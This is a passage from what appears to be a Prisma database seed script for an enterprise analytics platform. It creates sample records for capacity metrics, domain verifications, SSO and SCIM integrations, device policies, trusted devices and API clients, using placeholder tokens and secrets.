      metricType: 'MEMORY',
      currentValue: 50 + Math.random() * 25,
      maxValue: 100,
      threshold: 85,
      unit: 'percent',
      trend: 'STABLE',
      forecast: { nextWeek: 52 + Math.random() * 20, nextMonth: 55 + Math.random() * 25 },
    })
  }

  capacityMetrics.push(
    { service: 'PostgreSQL Primary', region: 'us-east-1', metricType: 'STORAGE', currentValue: 2.4, maxValue: 10, threshold: 8, unit: 'TB', trend: 'INCREASING', forecast: { nextWeek: 2.5, nextMonth: 2.8 } },
    { service: 'PostgreSQL Primary', region: 'us-east-1', metricType: 'CONNECTIONS', currentValue: 450, maxValue: 1000, threshold: 800, unit: 'connections', trend: 'STABLE' },
    { service: 'Redis Cluster', region: 'us-east-1', metricType: 'MEMORY', currentValue: 12, maxValue: 32, threshold: 28, unit: 'GB', trend: 'INCREASING', forecast: { nextWeek: 13, nextMonth: 15 } },
    { service: 'Elasticsearch', region: 'us-east-1', metricType: 'STORAGE', currentValue: 850, maxValue: 2000, threshold: 1800, unit: 'GB', trend: 'INCREASING', forecast: { nextWeek: 880, nextMonth: 950 } },
    { service: 'Message Queue', region: 'us-east-1', metricType: 'QUEUE_DEPTH', currentValue: 15000, maxValue: 100000, threshold: 80000, unit: 'messages', trend: 'STABLE' }
  )

  await prisma.capacityMetric.createMany({ data: capacityMetrics })

  // ==================== DOMAIN VERIFICATION ====================
  console.log('🌐 Creating domain verifications...')

  await prisma.domainVerification.createMany({
    data: [
      {
        orgId: enterpriseCo.id,
        domain: 'enterprise-co.com',
        status: 'VERIFIED',
        verificationType: 'DNS_TXT',
        verificationToken: 'gwi-verify=abc123def456',
        verifiedAt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 275 * 24 * 60 * 60 * 1000),
        autoRenew: true,
        isPrimary: true,
      },
      {
        orgId: enterpriseCo.id,
        domain: 'enterprise.io',
        status: 'VERIFIED',
        verificationType: 'DNS_CNAME',
        verificationToken: 'gwi-verify-cname.enterprise.io',
        verifiedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 305 * 24 * 60 * 60 * 1000),
        autoRenew: true,
        isPrimary: false,
      },
      {
        orgId: acmeCorp.id,
        domain: 'acme.com',
        status: 'VERIFIED',
        verificationType: 'DNS_TXT',
        verificationToken: 'gwi-verify=xyz789ghi012',
        verifiedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 335 * 24 * 60 * 60 * 1000),
        autoRenew: true,
        isPrimary: true,
      },
      {
        orgId: techStartup.id,
        domain: 'techstartup.io',
        status: 'PENDING',
        verificationType: 'DNS_TXT',
        verificationToken: 'gwi-verify=pending123',
        verificationAttempts: 2,
        lastAttemptAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
      },
      {
        orgId: acmeCorp.id,
        domain: 'acme-labs.dev',
        status: 'FAILED',
        verificationType: 'META_TAG',
        verificationToken: '<meta name="gwi-verify" content="failed456">',
        verificationAttempts: 5,
        lastAttemptAt: new Date(now.getTime() - 24 * 60 * 60 * 1000),
        failureReason: 'Meta tag not found on homepage after 5 attempts',
      },
      {
        orgId: enterpriseCo.id,
        domain: 'enterprise-legacy.net',
        status: 'EXPIRED',
        verificationType: 'DNS_TXT',
        verificationToken: 'gwi-verify=expired789',
        verifiedAt: new Date(now.getTime() - 400 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() - 35 * 24 * 60 * 60 * 1000),
        autoRenew: false,
      },
      // Additional domain verifications to reach 10
      {
        orgId: globalMediaOrg.id,
        domain: 'globalmedia.com',
        status: 'VERIFIED',
        verificationType: 'DNS_TXT',
        verificationToken: 'gwi-verify=global123',
        verifiedAt: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 320 * 24 * 60 * 60 * 1000),
        autoRenew: true,
        isPrimary: true,
      },
      {
        orgId: healthTechOrg.id,
        domain: 'healthtech-innovations.com',
        status: 'VERIFIED',
        verificationType: 'DNS_CNAME',
        verificationToken: 'gwi-verify-cname.healthtech.io',
        verifiedAt: new Date(now.getTime() - 20 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 345 * 24 * 60 * 60 * 1000),
        autoRenew: true,
        isPrimary: true,
      },
      {
        orgId: retailGiantOrg.id,
        domain: 'retail-giant.com',
        status: 'PENDING',
        verificationType: 'DNS_TXT',
        verificationToken: 'gwi-verify=retail456',
        verificationAttempts: 1,
        lastAttemptAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
      },
      {
        orgId: financeProOrg.id,
        domain: 'financepro.com',
        status: 'VERIFIED',
        verificationType: 'META_TAG',
        verificationToken: '<meta name="gwi-verify" content="finance789">',
        verifiedAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 350 * 24 * 60 * 60 * 1000),
        autoRenew: true,
        isPrimary: true,
      },
    ]
  })

  // ==================== ENTERPRISE SSO ====================
  console.log('🔐 Creating enterprise SSO configurations...')

  await prisma.enterpriseSSO.createMany({
    data: [
      {
        orgId: enterpriseCo.id,
        provider: 'OKTA',
        status: 'OPEN',
        config: {
          issuer: 'https://enterprise-co.okta.com',
          clientId: 'okta_client_12345',
          authorizationEndpoint: 'https://enterprise-co.okta.com/oauth2/v1/authorize',
          tokenEndpoint: 'https://enterprise-co.okta.com/oauth2/v1/token',
          userInfoEndpoint: 'https://enterprise-co.okta.com/oauth2/v1/userinfo',
          jwksUri: 'https://enterprise-co.okta.com/oauth2/v1/keys',
        },
        attributeMapping: {
          email: 'email',
          firstName: 'given_name',
          lastName: 'family_name',
          department: 'department',
          role: 'groups',
        },
        defaultRole: 'MEMBER',
        autoProvision: true,
        enforceSSO: true,
        allowedDomains: ['enterprise-co.com', 'enterprise.io'],
        lastSyncAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
        userCount: 127,
      },
      {
        orgId: acmeCorp.id,
        provider: 'AZURE_AD',
        status: 'OPEN',
        config: {
          tenantId: 'acme-tenant-uuid',
          clientId: 'azure_client_67890',
          authorizationEndpoint: 'https://login.microsoftonline.com/acme-tenant/oauth2/v2.0/authorize',
          tokenEndpoint: 'https://login.microsoftonline.com/acme-tenant/oauth2/v2.0/token',
        },
        attributeMapping: {
          email: 'mail',
          firstName: 'givenName',
          lastName: 'surname',
          department: 'department',
        },
        defaultRole: 'MEMBER',
        autoProvision: true,
        enforceSSO: false,
        allowedDomains: ['acme.com'],
        lastSyncAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
        userCount: 45,
      },
      {
        orgId: enterpriseCo.id,
        provider: 'SAML',
        status: 'TESTING',
        config: {
          entityId: 'https://gwi.com/saml/enterprise-co',
          ssoUrl: 'https://idp.enterprise-co.com/saml/sso',
          certificate: '-----BEGIN CERTIFICATE-----\nMIIC...truncated...==\n-----END CERTIFICATE-----',
          signatureAlgorithm: 'RSA-SHA256',
        },
        attributeMapping: {
          email: 'urn:oid:0.9.2342.19200300.100.1.3',
          firstName: 'urn:oid:2.5.4.42',
          lastName: 'urn:oid:2.5.4.4',
        },
        defaultRole: 'VIEWER',
        autoProvision: false,
        enforceSSO: false,
        userCount: 0,
      },
      {
        orgId: techStartup.id,
        provider: 'GOOGLE',
        status: 'PENDING_SETUP',
        config: {
          clientId: 'google_client_pending',
        },
        defaultRole: 'MEMBER',
        autoProvision: true,
        enforceSSO: false,
        allowedDomains: ['techstartup.io'],
        userCount: 0,
      },
      // Additional SSO configurations to reach 10
      {
        orgId: globalMediaOrg.id,
        provider: 'OKTA',
        status: 'OPEN',
        config: {
          issuer: 'https://globalmedia.okta.com',
          clientId: 'okta_gm_client_789',
          authorizationEndpoint: 'https://globalmedia.okta.com/oauth2/v1/authorize',
        },
        attributeMapping: { email: 'email', firstName: 'given_name', lastName: 'family_name' },
        defaultRole: 'MEMBER',
        autoProvision: true,
        enforceSSO: true,
        allowedDomains: ['globalmedia.com'],
        lastSyncAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        userCount: 234,
      },
      {
        orgId: healthTechOrg.id,
        provider: 'AZURE_AD',
        status: 'OPEN',
        config: {
          tenantId: 'healthtech-tenant-id',
          clientId: 'azure_ht_client_456',
        },
        attributeMapping: { email: 'mail', firstName: 'givenName', lastName: 'surname' },
        defaultRole: 'VIEWER',
        autoProvision: true,
        enforceSSO: true,
        allowedDomains: ['healthtech-innovations.com'],
        userCount: 89,
      },
      {
        orgId: retailGiantOrg.id,
        provider: 'PING_IDENTITY',
        status: 'TESTING',
        config: {
          issuer: 'https://auth.retail-giant.com',
          clientId: 'ping_retail_123',
        },
        attributeMapping: { email: 'email', firstName: 'first_name', lastName: 'last_name' },
        defaultRole: 'MEMBER',
        autoProvision: false,
        enforceSSO: false,
        userCount: 0,
      },
      {
        orgId: financeProOrg.id,
        provider: 'SAML',
        status: 'OPEN',
        config: {
          entityId: 'https://gwi.com/saml/financepro',
          ssoUrl: 'https://sso.financepro.com/saml/login',
          certificate: '-----BEGIN CERTIFICATE-----\nMIIB...finance...==\n-----END CERTIFICATE-----',
        },
        attributeMapping: { email: 'email', firstName: 'firstName', lastName: 'lastName' },
        defaultRole: 'MEMBER',
        autoProvision: true,
        enforceSSO: true,
        userCount: 67,
      },
      {
        orgId: globalMediaOrg.id,
        provider: 'ONELOGIN',
        status: 'DISABLED',
        config: {
          clientId: 'onelogin_legacy_client',
        },
        attributeMapping: { email: 'email' },
        defaultRole: 'VIEWER',
        autoProvision: false,
        enforceSSO: false,
        userCount: 0,
      },
      {
        orgId: acmeCorp.id,
        provider: 'AUTH0',
        status: 'PENDING_SETUP',
        config: {
          domain: 'acme.auth0.com',
          clientId: 'auth0_acme_pending',
        },
        defaultRole: 'MEMBER',
        autoProvision: true,
        enforceSSO: false,
        userCount: 0,
      },
    ]
  })

  // ==================== SCIM INTEGRATIONS ====================
  console.log('👥 Creating SCIM integrations...')

  await prisma.sCIMIntegration.createMany({
    data: [
      {
        orgId: enterpriseCo.id,
        provider: 'OKTA',
        status: 'OPEN',
        endpoint: 'https://api.gwi.com/scim/v2/enterprise-co',
        bearerToken: 'scim_token_encrypted_abc123',
        config: {
          syncUsers: true,
          syncGroups: true,
          autoDeactivate: true,
          syncInterval: 15,
        },
        lastSyncAt: new Date(now.getTime() - 15 * 60 * 1000),
        lastSyncStatus: 'SUCCESS',
        syncStats: { usersCreated: 5, usersUpdated: 12, usersDeactivated: 2, groupsCreated: 1 },
        userCount: 127,
        groupCount: 8,
      },
      {
        orgId: acmeCorp.id,
        provider: 'AZURE_AD',
        status: 'OPEN',
        endpoint: 'https://api.gwi.com/scim/v2/acme-corp',
        bearerToken: 'scim_token_encrypted_def456',
        config: {
          syncUsers: true,
          syncGroups: false,
          autoDeactivate: true,
          syncInterval: 30,
        },
        lastSyncAt: new Date(now.getTime() - 25 * 60 * 1000),
        lastSyncStatus: 'SUCCESS',
        syncStats: { usersCreated: 0, usersUpdated: 3, usersDeactivated: 0 },
        userCount: 45,
        groupCount: 0,
      },
      {
        orgId: enterpriseCo.id,
        provider: 'CUSTOM',
        status: 'ERROR',
        endpoint: 'https://api.gwi.com/scim/v2/enterprise-co-legacy',
        bearerToken: 'scim_token_encrypted_ghi789',
        config: {
          syncUsers: true,
          syncGroups: true,
          autoDeactivate: false,
          syncInterval: 60,
        },
        lastSyncAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        lastSyncStatus: 'FAILED',
        lastSyncError: 'Connection timeout: Legacy IdP not responding',
        userCount: 15,
        groupCount: 2,
      },
      // Additional SCIM integrations to reach 10
      {
        orgId: globalMediaOrg.id,
        provider: 'OKTA',
        status: 'OPEN',
        endpoint: 'https://api.gwi.com/scim/v2/global-media',
        bearerToken: 'scim_token_encrypted_gm001',
        config: { syncUsers: true, syncGroups: true, autoDeactivate: true, syncInterval: 15 },
        lastSyncAt: new Date(now.getTime() - 10 * 60 * 1000),
        lastSyncStatus: 'SUCCESS',
        syncStats: { usersCreated: 10, usersUpdated: 25, usersDeactivated: 3, groupsCreated: 2 },
        userCount: 234,
        groupCount: 12,
      },
      {
        orgId: healthTechOrg.id,
        provider: 'AZURE_AD',
        status: 'OPEN',
        endpoint: 'https://api.gwi.com/scim/v2/healthtech',
        bearerToken: 'scim_token_encrypted_ht002',
        config: { syncUsers: true, syncGroups: false, autoDeactivate: true, syncInterval: 30 },
        lastSyncAt: new Date(now.getTime() - 20 * 60 * 1000),
        lastSyncStatus: 'SUCCESS',
        syncStats: { usersCreated: 2, usersUpdated: 8, usersDeactivated: 0 },
        userCount: 89,
        groupCount: 0,
      },
      {
        orgId: retailGiantOrg.id,
        provider: 'PING_IDENTITY',
        status: 'PENDING_SETUP',
        endpoint: 'https://api.gwi.com/scim/v2/retail-giant',
        bearerToken: 'scim_token_encrypted_rg003',
        config: { syncUsers: true, syncGroups: true, autoDeactivate: false, syncInterval: 60 },
        userCount: 0,
        groupCount: 0,
      },
      {
        orgId: financeProOrg.id,
        provider: 'JUMPCLOUD',
        status: 'OPEN',
        endpoint: 'https://api.gwi.com/scim/v2/financepro',
        bearerToken: 'scim_token_encrypted_fp004',
        config: { syncUsers: true, syncGroups: true, autoDeactivate: true, syncInterval: 20 },
        lastSyncAt: new Date(now.getTime() - 15 * 60 * 1000),
        lastSyncStatus: 'SUCCESS',
        syncStats: { usersCreated: 1, usersUpdated: 6, usersDeactivated: 1, groupsCreated: 0 },
        userCount: 67,
        groupCount: 5,
      },
      {
        orgId: globalMediaOrg.id,
        provider: 'ONELOGIN',
        status: 'DISABLED',
        endpoint: 'https://api.gwi.com/scim/v2/global-media-legacy',
        bearerToken: 'scim_token_encrypted_gm005',
        config: { syncUsers: true, syncGroups: false, autoDeactivate: false, syncInterval: 60 },
        lastSyncStatus: 'DISABLED',
        userCount: 0,
        groupCount: 0,
      },
      {
        orgId: techStartup.id,
        provider: 'GOOGLE',
        status: 'TESTING',
        endpoint: 'https://api.gwi.com/scim/v2/techstartup',
        bearerToken: 'scim_token_encrypted_ts006',
        config: { syncUsers: true, syncGroups: false, autoDeactivate: false, syncInterval: 30 },
        lastSyncAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
        lastSyncStatus: 'PARTIAL',
        syncStats: { usersCreated: 3, usersUpdated: 0, errors: 2 },
        lastSyncError: 'Some users failed due to email format validation',
        userCount: 12,
        groupCount: 0,
      },
      {
        orgId: acmeCorp.id,
        provider: 'CUSTOM',
        status: 'OPEN',
        endpoint: 'https://api.gwi.com/scim/v2/acme-hr-system',
        bearerToken: 'scim_token_encrypted_ac007',
        config: { syncUsers: true, syncGroups: true, autoDeactivate: true, syncInterval: 45 },
        lastSyncAt: new Date(now.getTime() - 35 * 60 * 1000),
        lastSyncStatus: 'SUCCESS',
        syncStats: { usersCreated: 0, usersUpdated: 4, usersDeactivated: 1, groupsCreated: 0 },
        userCount: 45,
        groupCount: 3,
      },
    ]
  })

  // ==================== DEVICE POLICIES ====================
  console.log('📱 Creating device policies...')

  const corpDevicePolicy = await prisma.devicePolicy.create({
    data: {
      orgId: enterpriseCo.id,
      name: 'Enterprise Device Policy',
      description: 'Standard device requirements for enterprise organization access',
      isActive: true,
      requirements: {
        minOSVersions: { windows: '10.0.19041', macos: '12.0', ios: '15.0', android: '12' },
        requireEncryption: true,
        requireScreenLock: true,
        requireBiometric: false,
        blockJailbroken: true,
        blockRooted: true,
        requireMDM: false,
        allowedDeviceTypes: ['desktop', 'laptop', 'tablet', 'phone'],
      },
      maxDevicesPerUser: 5,
      inactivityTimeout: 30,
      requireReauthDays: 7,
    }
  })

  const strictDevicePolicy = await prisma.devicePolicy.create({
    data: {
      orgId: enterpriseCo.id,
      name: 'High Security Device Policy',
      description: 'Strict requirements for accessing sensitive data',
      isActive: true,
      requirements: {
        minOSVersions: { windows: '11.0', macos: '13.0', ios: '16.0', android: '13' },
        requireEncryption: true,
        requireScreenLock: true,
        requireBiometric: true,
        blockJailbroken: true,
        blockRooted: true,
        requireMDM: true,
        allowedDeviceTypes: ['desktop', 'laptop'],
      },
      maxDevicesPerUser: 2,
      inactivityTimeout: 15,
      requireReauthDays: 1,
    }
  })

  await prisma.devicePolicy.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        name: 'Standard Device Policy',
        description: 'Basic device requirements for Acme Corp',
        isActive: true,
        requirements: {
          minOSVersions: { windows: '10.0', macos: '11.0', ios: '14.0', android: '11' },
          requireEncryption: true,
          requireScreenLock: true,
          blockJailbroken: true,
        },
        maxDevicesPerUser: 3,
        inactivityTimeout: 60,
        requireReauthDays: 14,
      },
      {
        orgId: techStartup.id,
        name: 'Flexible Device Policy',
        description: 'Relaxed policy for startup environment',
        isActive: true,
        requirements: {
          requireEncryption: false,
          requireScreenLock: true,
          blockJailbroken: false,
        },
        maxDevicesPerUser: 10,
        inactivityTimeout: 120,
        requireReauthDays: 30,
      },
      // Additional device policies to reach 10
      {
        orgId: globalMediaOrg.id,
        name: 'Media Industry Standard Policy',
        description: 'Device requirements for media industry with creative software needs',
        isActive: true,
        requirements: {
          minOSVersions: { windows: '10.0.19041', macos: '13.0' },
          requireEncryption: true,
          requireScreenLock: true,
          requireBiometric: false,
          blockJailbroken: true,
          allowedDeviceTypes: ['desktop', 'laptop'],
        },
        maxDevicesPerUser: 4,
        inactivityTimeout: 45,
        requireReauthDays: 7,
      },
      {
        orgId: healthTechOrg.id,
        name: 'HIPAA Compliant Device Policy',
        description: 'Strict device requirements for HIPAA compliance',
        isActive: true,
        requirements: {
          minOSVersions: { windows: '11.0', macos: '14.0', ios: '17.0', android: '14' },
          requireEncryption: true,
          requireScreenLock: true,
          requireBiometric: true,
          blockJailbroken: true,
          blockRooted: true,
          requireMDM: true,
          allowedDeviceTypes: ['desktop', 'laptop'],
        },
        maxDevicesPerUser: 2,
        inactivityTimeout: 10,
        requireReauthDays: 1,
      },
      {
        orgId: retailGiantOrg.id,
        name: 'Retail Operations Policy',
        description: 'Device policy for retail store operations',
        isActive: true,
        requirements: {
          minOSVersions: { android: '11', ios: '15.0' },
          requireEncryption: true,
          requireScreenLock: true,
          blockJailbroken: true,
          allowedDeviceTypes: ['tablet', 'phone'],
        },
        maxDevicesPerUser: 3,
        inactivityTimeout: 30,
        requireReauthDays: 14,
      },
      {
        orgId: financeProOrg.id,
        name: 'Financial Services Policy',
        description: 'Enhanced security for financial services access',
        isActive: true,
        requirements: {
          minOSVersions: { windows: '11.0', macos: '14.0' },
          requireEncryption: true,
          requireScreenLock: true,
          requireBiometric: true,
          blockJailbroken: true,
          blockRooted: true,
          requireMDM: true,
          allowedDeviceTypes: ['desktop', 'laptop'],
        },
        maxDevicesPerUser: 2,
        inactivityTimeout: 15,
        requireReauthDays: 3,
      },
      {
        orgId: globalMediaOrg.id,
        name: 'Contractor Device Policy',
        description: 'Limited access policy for external contractors',
        isActive: true,
        requirements: {
          requireEncryption: true,
          requireScreenLock: true,
          blockJailbroken: true,
        },
        maxDevicesPerUser: 1,
        inactivityTimeout: 15,
        requireReauthDays: 1,
      },
      {
        orgId: enterpriseCo.id,
        name: 'Mobile Only Policy',
        description: 'Policy for mobile-only users',
        isActive: true,
        requirements: {
          minOSVersions: { ios: '16.0', android: '13' },
          requireEncryption: true,
          requireScreenLock: true,
          requireBiometric: true,
          blockJailbroken: true,
          blockRooted: true,
          allowedDeviceTypes: ['phone'],
        },
        maxDevicesPerUser: 2,
        inactivityTimeout: 30,
        requireReauthDays: 7,
      },
    ]
  })

  // ==================== TRUSTED DEVICES ====================
  console.log('💻 Creating trusted devices...')

  await prisma.trustedDevice.createMany({
    data: [
      {
        userId: adminUser.id,
        deviceId: 'device_admin_macbook_001',
        name: 'Admin MacBook Pro',
        type: 'LAPTOP',
        platform: 'MACOS',
        osVersion: '14.2.1',
        model: 'MacBook Pro 16"',
        manufacturer: 'Apple',
        isCompliant: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
        lastIpAddress: '192.168.1.100',
        lastLocation: 'San Francisco, CA',
      },
      {
        userId: adminUser.id,
        deviceId: 'device_admin_iphone_001',
        name: 'Admin iPhone 15',
        type: 'MOBILE',
        platform: 'IOS',
        osVersion: '17.2',
        model: 'iPhone 15 Pro',
        manufacturer: 'Apple',
        isCompliant: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 20 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
        lastIpAddress: '192.168.1.150',
        lastLocation: 'San Francisco, CA',
      },
      {
        userId: johnDoe.id,
        deviceId: 'device_john_windows_001',
        name: 'John Work Desktop',
        type: 'DESKTOP',
        platform: 'WINDOWS',
        osVersion: '11.0.22631',
        model: 'OptiPlex 7090',
        manufacturer: 'Dell',
        isCompliant: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        lastIpAddress: '192.168.1.110',
        lastLocation: 'New York, NY',
      },
      {
        userId: janeSmith.id,
        deviceId: 'device_jane_macbook_001',
        name: 'Jane MacBook Air',
        type: 'LAPTOP',
        platform: 'MACOS',
        osVersion: '13.6',
        model: 'MacBook Air M2',
        manufacturer: 'Apple',
        isCompliant: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
        lastIpAddress: '10.0.0.55',
        lastLocation: 'Boston, MA',
      },
      {
        userId: sarahEnterprise.id,
        deviceId: 'device_sarah_thinkpad_001',
        name: 'Sarah ThinkPad X1',
        type: 'LAPTOP',
        platform: 'WINDOWS',
        osVersion: '11.0.22621',
        model: 'ThinkPad X1 Carbon',
        manufacturer: 'Lenovo',
        isCompliant: true,
        isManaged: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 30 * 60 * 1000),
        lastIpAddress: '172.16.0.50',
        lastLocation: 'London, UK',
      },
      {
        userId: sarahEnterprise.id,
        deviceId: 'device_sarah_pixel_001',
        name: 'Sarah Pixel 8',
        type: 'MOBILE',
        platform: 'ANDROID',
        osVersion: '14',
        model: 'Pixel 8 Pro',
        manufacturer: 'Google',
        isCompliant: false,
        trustStatus: 'PENDING',
        lastActiveAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        lastIpAddress: '185.220.101.50',
        lastLocation: 'Unknown',
      },
      {
        userId: bobWilson.id,
        deviceId: 'device_bob_macmini_001',
        name: 'Bob Mac Mini',
        type: 'DESKTOP',
        platform: 'MACOS',
        osVersion: '14.1',
        model: 'Mac Mini M2',
        manufacturer: 'Apple',
        isCompliant: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
        lastIpAddress: '192.168.50.100',
        lastLocation: 'Austin, TX',
      },
      {
        userId: johnDoe.id,
        deviceId: 'device_john_ipad_001',
        name: 'John iPad Pro',
        type: 'TABLET',
        platform: 'IOS',
        osVersion: '17.1',
        model: 'iPad Pro 12.9"',
        manufacturer: 'Apple',
        isCompliant: false,
        trustStatus: 'REVOKED',
        trustedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        lastIpAddress: '45.33.32.100',
        lastLocation: 'Unknown',
      },
      {
        userId: adminUser.id,
        deviceId: 'device_admin_linux_001',
        name: 'Admin Ubuntu Workstation',
        type: 'DESKTOP',
        platform: 'LINUX',
        osVersion: '22.04',
        model: 'Custom Build',
        manufacturer: 'Custom',
        isCompliant: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 100 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 48 * 60 * 60 * 1000),
        lastIpAddress: '192.168.1.200',
        lastLocation: 'San Francisco, CA',
      },
      {
        userId: sarahEnterprise.id,
        deviceId: 'device_sarah_surface_001',
        name: 'Sarah Surface Pro',
        type: 'TABLET',
        platform: 'WINDOWS',
        osVersion: '11.0.22631',
        model: 'Surface Pro 9',
        manufacturer: 'Microsoft',
        isCompliant: true,
        isManaged: true,
        trustStatus: 'TRUSTED',
        trustedAt: new Date(now.getTime() - 50 * 24 * 60 * 60 * 1000),
        lastActiveAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
        lastIpAddress: '172.16.0.75',
        lastLocation: 'London, UK',
      },
    ]
  })

  // ==================== API CLIENTS ====================
  console.log('🔌 Creating API clients...')

  await prisma.aPIClient.createMany({
    data: [
      {
        orgId: enterpriseCo.id,
        name: 'Production Data Pipeline',
        description: 'Main production API client for data synchronization',
        clientId: 'client_prod_enterprise_001',
        clientSecret: 'secret_encrypted_abc123xyz',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
        scopes: ['read:audiences', 'write:audiences', 'read:insights', 'read:reports', 'write:exports'],
        redirectUris: ['https://enterprise-co.com/oauth/callback'],
        allowedOrigins: ['https://enterprise-co.com', 'https://app.enterprise-co.com'],
        rateLimitOverride: 2000,
        lastUsed: new Date(now.getTime() - 5 * 60 * 1000),
        requestCount: 1456789,
        createdBy: sarahEnterprise.id,
      },
      {
        orgId: enterpriseCo.id,
        name: 'Analytics Dashboard',
        description: 'Internal analytics dashboard integration',
        clientId: 'client_analytics_enterprise_002',
        clientSecret: 'secret_encrypted_def456abc',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
        scopes: ['read:analytics', 'read:reports', 'read:dashboards'],
        redirectUris: ['https://analytics.enterprise-co.com/callback'],
        allowedOrigins: ['https://analytics.enterprise-co.com'],
        lastUsed: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        requestCount: 234567,
        createdBy: sarahEnterprise.id,
      },
      {
        orgId: acmeCorp.id,
        name: 'Acme Integration Service',
        description: 'Server-to-server integration for Acme Corp',
        clientId: 'client_prod_acme_001',
        clientSecret: 'secret_encrypted_ghi789def',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
        scopes: ['read:audiences', 'read:insights', 'write:reports'],
        rateLimitOverride: 500,
        lastUsed: new Date(now.getTime() - 30 * 60 * 1000),
        requestCount: 89234,
        createdBy: adminUser.id,
      },
      {
        orgId: acmeCorp.id,
        name: 'Mobile App Client',
        description: 'Public client for Acme mobile application',
        clientId: 'client_mobile_acme_002',
        type: 'PUBLIC',
        status: 'OPEN',
        scopes: ['read:profile', 'read:dashboards', 'read:reports'],
        redirectUris: ['acme://oauth/callback', 'https://mobile.acme.com/callback'],
        lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000),
        requestCount: 45678,
        createdBy: adminUser.id,
      },
      {
        orgId: techStartup.id,
        name: 'Startup API Client',
        description: 'Main API client for Tech Startup',
        clientId: 'client_prod_startup_001',
        clientSecret: 'secret_encrypted_jkl012ghi',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
        scopes: ['read:audiences', 'read:insights'],
        lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000),
        requestCount: 12345,
        createdBy: bobWilson.id,
      },
      {
        orgId: enterpriseCo.id,
        name: 'Legacy Integration (Deprecated)',
        description: 'Old integration client - scheduled for removal',
        clientId: 'client_legacy_enterprise_003',
        clientSecret: 'secret_encrypted_mno345jkl',
        type: 'CONFIDENTIAL',
        status: 'DEPRECATED',
        scopes: ['read:all'],
        deprecatedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        deprecationReason: 'Migrated to new Production Data Pipeline client',
        lastUsed: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000),
        requestCount: 567890,
        createdBy: sarahEnterprise.id,
      },
      {
        orgId: acmeCorp.id,
        name: 'Testing Client',
        description: 'Client for staging and testing environments',
        clientId: 'client_test_acme_003',
        clientSecret: 'secret_encrypted_pqr678mno',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
        scopes: ['read:*', 'write:*'],
        allowedOrigins: ['http://localhost:3000', 'https://staging.acme.com'],
        ipWhitelist: ['192.168.1.0/24', '10.0.0.0/8'],
        lastUsed: new Date(now.getTime() - 6 * 60 * 60 * 1000),
        requestCount: 5678,
        createdBy: johnDoe.id,
      },
      {
        orgId: enterpriseCo.id,
        name: 'Webhook Processor',
        description: 'Service account for webhook processing',
        clientId: 'client_webhook_enterprise_004',
        clientSecret: 'secret_encrypted_stu901pqr',
        type: 'SERVICE_ACCOUNT',
        status: 'OPEN',
        scopes: ['webhooks:send', 'events:read'],
        lastUsed: new Date(now.getTime() - 1 * 60 * 1000),
        requestCount: 2345678,
        createdBy: sarahEnterprise.id,
      },
      // Additional API clients to reach 10
      {
        orgId: globalMediaOrg.id,
        name: 'Global Media Integration',
        description: 'API client for Global Media Group integration',
        clientId: 'client_prod_globalmedia_001',
        clientSecret: 'secret_encrypted_gm001xyz',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
        scopes: ['read:audiences', 'write:audiences', 'read:insights', 'read:reports'],
        rateLimitOverride: 3000,
        lastUsed: new Date(now.getTime() - 15 * 60 * 1000),
        requestCount: 987654,
        createdBy: adminUser.id,
      },
      {
        orgId: healthTechOrg.id,
        name: 'HealthTech Data Connector',
        description: 'HIPAA-compliant API client for healthcare data',
        clientId: 'client_prod_healthtech_001',
        clientSecret: 'secret_encrypted_ht001abc',
        type: 'CONFIDENTIAL',
        status: 'OPEN',
